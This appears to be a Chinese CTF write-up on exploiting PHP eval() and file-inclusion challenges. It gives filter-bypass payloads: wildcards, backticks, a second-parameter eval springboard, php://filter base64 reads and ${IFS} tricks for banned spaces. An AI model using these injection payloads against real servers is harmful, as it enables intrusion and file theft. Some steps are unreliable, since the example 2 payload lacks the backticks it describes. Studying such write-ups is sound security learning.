类型一——eval

在题目最终语句为eval执行语句时，可以通过调用系统命令来操作

例一、过滤flag：
 <?php 
error_reporting(0);
  if(isset($_GET['c']))
 {
   $c = $_GET['c'];
        if(!preg_match("/flag/i", $c)){
              eval($c);`     
       }   
    }  
 else{
       highlight_file(__FILE__);
 }

那么可以看到，我们需要传入的变量为c

同时过滤掉了flag字符

因为其中没有进行任何的过滤，且会执行c

那我们就可以通过system(“ls”)直接调用系统命令来去观察目录结构

看到了flag.php，但是因为flag被过滤掉了，不能直接调用，那就可以使用cp来进行替换

cp命令全程（copy file），将前者中的文件复制到后者中，在复制的过程中，注意flag字符是被过滤的，所以要用 ? 等通配符去进行替换

例二、过滤system：
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}

关于本题，有招，在linux中，有一个符号可以将被它包裹的东西当作系统命令来运行

它就是——————————反引号

我们只需要传入payload:?c=cp fla?.??? 1.txt,然后访问1.txt即可，这里因为过滤掉了flag和php，用通配符代替下

例三、相对难点的过滤
 <?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|.| |'/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}

可以看到，我们这里过滤的东西非常多，虽然但是反引号还活着，也不可以使用上一道题的方法直接走，因为空格没了,nnd

这里我们就可以采用一种新的方法：跳板

思路就是题目要求我传进去个c

但是我传进去的c的内容是执行a，那a受不受过滤的限制？

不受

那么该如何实现呢?

首先我们的c要接收一个变量，定为1,那么肯定要执行接收的命令

就用到了

eval($_GET[1])

这是表示接收1的命令，那咋样才能定义这个1的值呢？

我们先结束这条语句，然后在后面用&连接

1不受限制，那我们就可以直接写payload了

payload:?c=eval($_GET[1]);&1=system(‘cat flag.php’);

这里用到了cat，简单来说就是显示后续文件内容的一条命令

执行完之后，发现。woc，空白的

别慌

我们查看下源代码即可得到flag

那有无更简单的办法？

咱不是用cat了吗，这玩意显示文件时候是按行正序，如果flag正好在末尾就不好办了

咋样才能按行倒序？

cat倒过来是啥？

tac！

诶嘿，把payload里的cat换成tac

得到flag

例四、涉及到文件包含的绕过

文件包含漏洞，主要是因为以下的四个函数引起的

include()、include_once()、require()、require_once()

这里主要来说一说include

include:包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。

当我们使用这四个函数去包含文件时，无论被包含的是什么类型的文件，都会被当作PHP文件进行解析

文件包含有两种

分别是本地LFI和远程RFI

这道题我们用到了LFI中的php://filter

说说index2.php?file=php://filter/read=convert.base64-encode/resource=index.php的含义 首先这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后，resource=index.php表示目标文件为index.php。

这道题相对于例四，没有什么太大的变化，所以我们可以使用例四的方法进行处理

那么咱们换一个方法

也是文件包含，那么咱们可以使用require

require实际上和include没有太大的区别

require () 语句的性能与 include () 相类似，都是包括并运行指定文件。不同之处在于：对 include () 语句来说，在执行文件时每次都要进行读取和评估；而对于 require () 来说，文件只处理一次

例N 黑洞

1>/dev/null 2>&1

代表重定向到哪里，例如：echo “123” > /home/123.txt 1 表示stdout标准输出，系统默认值是1，所以”>/dev/null”等同于”1>/dev/null” 2 表示stderr标准错误 & 表示等同于的意思，2>&1，表示2的输出重定向等同于1

使用&&绕过即可

空格被ban

{cat,flag.txt} 
cat${IFS}flag.txt
cat$IFS$9flag.txt
cat<flag.txt
cat<>flag.txt
  • require 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；
  • include 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。
  • require 引入的文件有错误时，执行会中断，并返回一个致命错误；
  • include 引入的文件有错误时，会继续执行，并返回一个警告。
